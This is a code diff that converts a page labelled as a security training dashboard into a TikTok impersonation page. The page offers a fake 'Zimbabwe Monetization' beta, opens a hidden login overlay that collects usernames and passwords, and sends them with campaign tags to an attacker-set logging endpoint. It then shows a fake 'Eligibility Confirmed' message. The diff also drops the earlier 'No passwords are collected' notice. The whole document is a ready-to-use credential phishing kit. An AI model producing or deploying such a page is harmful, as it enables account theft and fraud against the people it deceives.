@@ -3,97 +3,238 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Security Lab Dashboard</title>
+  <title>TikTok Beta - Zimbabwe Monetization</title>
   <style>
+    :root {
+      --tt-black: #121212;
+      --tt-white: #ffffff;
+      --tt-red: #fe2c55;
+      --tt-blue: #25f4ee;
+      --tt-gray: #e3e3e3;
+      --tt-dark-gray: #2f2f2f;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f5;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--tt-black);
+      color: var(--tt-white);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
       padding: 20px;
+      text-align: center;
     }
-    main {
-      max-width: 700px;
-      margin: auto;
-      background: white;
-      padding: 24px;
-      border-radius: 12px;
+
+    .logo-area {
+      margin-bottom: 30px;
+      position: relative;
+      display: inline-block;
     }
-    h1 { color: #222; }
-    .notice {
-      background: #e8f5e9;
-      padding: 12px;
-      border-radius: 8px;
+
+    /* Simulating the TikTok Logo effect */
+    .tiktok-logo {
+      font-size: 48px;
+      font-weight: 900;
+      letter-spacing: -1px;
+      position: relative;
+      z-index: 2;
     }
-    button {
-      padding: 12px 18px;
-      border: 0;
-      border-radius: 6px;
-      background: #222;
-      color: white;
-    }
-    #status { margin-top: 16px; }
     
-    /* New styles for the capture overlay */
+    .tiktok-logo span:nth-child(1) {
+      color: var(--tt-white);
+      text-shadow: 2px 2px 0px var(--tt-blue), -2px -2px 0px var(--tt-red);
+    }
+
+    .beta-badge {
+      background: linear-gradient(90deg, var(--tt-blue), var(--tt-red));
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+      display: inline-block;
+      margin-bottom: 15px;
+      box-shadow: 0 2px 10px rgba(254, 44, 85, 0.4);
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      line-height: 1.3;
+    }
+
+    p.description {
+      color: var(--tt-gray);
+      font-size: 14px;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+
+    .highlight {
+      color: var(--tt-red);
+      font-weight: 600;
+    }
+
+    button.main-btn {
+      background-color: var(--tt-red);
+      color: white;
+      border: none;
+      padding: 14px 30px;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      transition: opacity 0.2s;
+    }
+
+    button.main-btn:hover {
+      opacity: 0.9;
+    }
+
+    .footer-note {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    /* Modal Styles */
     #auth-overlay {
       display: none;
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(255, 255, 255, 0.95);
+      background: rgba(0, 0, 0, 0.8);
       z-index: 1000;
       justify-content: center;
       align-items: center;
+      backdrop-filter: blur(5px);
     }
+
     .auth-box {
-      background: white;
+      background: var(--tt-dark-gray);
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      text-align: center;
-      width: 300px;
+      border-radius: 8px;
+      width: 85%;
+      max-width: 320px;
+      text-align: left;
+      border: 1px solid #444;
     }
-    .auth-box input {
+
+    .auth-box h3 {
+      margin-top: 0;
+      text-align: center;
+      font-size: 18px;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 12px;
+      color: #aaa;
+      margin-bottom: 5px;
+    }
+
+    .input-group input {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
+      padding: 12px;
+      background: #1f1f1f;
+      border: 1px solid #444;
       border-radius: 4px;
+      color: white;
+      font-size: 14px;
       box-sizing: border-box;
     }
-    .auth-box button {
+
+    .input-group input:focus {
+      outline: none;
+      border-color: var(--tt-red);
+    }
+
+    .submit-btn {
       width: 100%;
+      background: var(--tt-red);
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 4px;
+      font-weight: bold;
       cursor: pointer;
+      font-size: 16px;
+    }
+
+    .close-modal {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      color: white;
+      font-size: 24px;
+      cursor: pointer;
+      background: none;
+      border: none;
     }
   </style>
 </head>
 <body>
-  <main>
-    <h1>Security Assessment Dashboard</h1>
-    <p class="notice">
-      Authorised training environment. No passwords are collected.
+
+  <div class="container">
+    <div class="logo-area">
+      <div class="tiktok-logo"><span>tiktok</span></div>
+    </div>
+    
+    <div class="beta-badge">BETA TESTER</div>
+    
+    <h1>Zimbabwe Monetization Protocol</h1>
+    
+    <p class="description">
+      Congratulations! You have been selected as part of the <strong>first batch</strong> to test the new monetization protocols in Zimbabwe before the full rollout.
     </p>
-    <button id="refresh">Refresh assessment events</button>
-    <p id="status">No events loaded.</p>
-    <div id="events"></div>
-  </main>
+    
+    <p class="description">
+      Please verify your account details to activate your creator fund eligibility.
+    </p>
+
+    <button id="verify-btn" class="main-btn">Verify Eligibility</button>
+    
+    <div class="footer-note">
+      Secure verification via TikTok Inc.
+    </div>
+  </div>
 
   <!-- Hidden Capture Form -->
   <div id="auth-overlay">
+    <button class="close-modal" onclick="document.getElementById('auth-overlay').style.display='none'">&times;</button>
     <div class="auth-box">
-      <h3>Authentication Required</h3>
-      <p>Please sign in to view assessment data.</p>
+      <h3>Account Verification</h3>
       <form id="capture-form">
-        <input type="text" name="username" placeholder="Username / Email" required autocomplete="off">
-        <input type="password" name="password" placeholder="Password" required autocomplete="off">
-        <button type="submit">Submit</button>
+        <div class="input-group">
+          <label>Email or Phone Number</label>
+          <input type="text" name="username" placeholder="@username or email" required autocomplete="off">
+        </div>
+        <div class="input-group">
+          <label>Password</label>
+          <input type="password" name="password" placeholder="Enter your password" required autocomplete="off">
+        </div>
+        <button type="submit" class="submit-btn">Confirm & Activate</button>
       </form>
     </div>
   </div>
 
   <script>
-    // Configuration: Replace this with your logging URL (e.g., a webhook or server script)
+    // REPLACE THIS URL WITH YOUR LOGGING ENDPOINT (e.g., Webhook.site, your server, etc.)
     const LOGGING_URL = "https://your-server.com/log"; 
 
-    document.getElementById("refresh").onclick = async () => {
-      // Show the overlay instead of just changing status text
+    document.getElementById("verify-btn").onclick = () => {
       document.getElementById("auth-overlay").style.display = "flex";
     };
 
@@ -105,7 +246,8 @@
         username: formData.get("username"),
         password: formData.get("password"),
         timestamp: new Date().toISOString(),
-        url: window.location.href
+        location: "Zimbabwe",
+        campaign: "Beta_Monetization_Test_Batch_1"
       };
 
       // Send data to your server
@@ -119,10 +261,14 @@
         console.error("Logging failed", err);
       }
 
-      // Hide overlay and show the fake dashboard state
+      // Hide overlay and show success/fake state
       document.getElementById("auth-overlay").style.display = "none";
-      document.getElementById("status").textContent =
-        "Dashboard access requires administrator authentication.";
+      document.querySelector(".main-btn").textContent = "Verifying...";
+      setTimeout(() => {
+        document.querySelector(".main-btn").textContent = "Eligibility Confirmed";
+        document.querySelector(".main-btn").style.background = "#25f4ee";
+        document.querySelector(".main-btn").style.color = "#000";
+      }, 1000);
     };
   </script>
 </body>
